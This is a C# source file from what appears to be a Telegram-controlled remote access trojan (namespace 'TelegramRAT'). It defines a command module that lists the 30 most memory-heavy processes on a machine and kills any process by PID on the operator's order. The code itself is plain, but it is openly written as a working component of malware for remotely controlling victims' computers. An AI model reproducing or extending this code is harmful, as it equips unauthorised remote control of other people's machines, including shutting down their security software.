namespace TelegramRAT.Commands;

using System.Diagnostics;
using System.Text;
using TelegramRAT.Models;

internal sealed class ProcessCmd : IAsyncCommand
{
    public Task<CommandResult> ExecuteAsync(string[] args)
    {
        if (args.Length > 0 && int.TryParse(args[0], out var pid))
            return Task.FromResult(KillProcess(pid));

        return Task.FromResult(ListProcesses());
    }

    private static CommandResult ListProcesses()
    {
        var sb = new StringBuilder();
        sb.AppendLine("PID      | Memory    | Name");
        sb.AppendLine("---------|-----------|------------------");

        var processes = Process.GetProcesses()
            .OrderByDescending(p => p.WorkingSet64)
            .Take(30);

        foreach (var p in processes)
        {
            var memMb = p.WorkingSet64 / (1024 * 1024);
            sb.AppendLine($"{p.Id,-8} | {memMb,5} MB | {p.ProcessName}");
        }

        return CommandResult.Text(sb.ToString());
    }

    private static CommandResult KillProcess(int pid)
    {
        try
        {
            var process = Process.GetProcessById(pid);
            var name = process.ProcessName;
            process.Kill();
            return CommandResult.Text($"Killed: {name} (PID {pid})");
        }
        catch (Exception ex)
        {
            return CommandResult.Text($"Failed to kill PID {pid}: {ex.Message}");
        }
    }
}
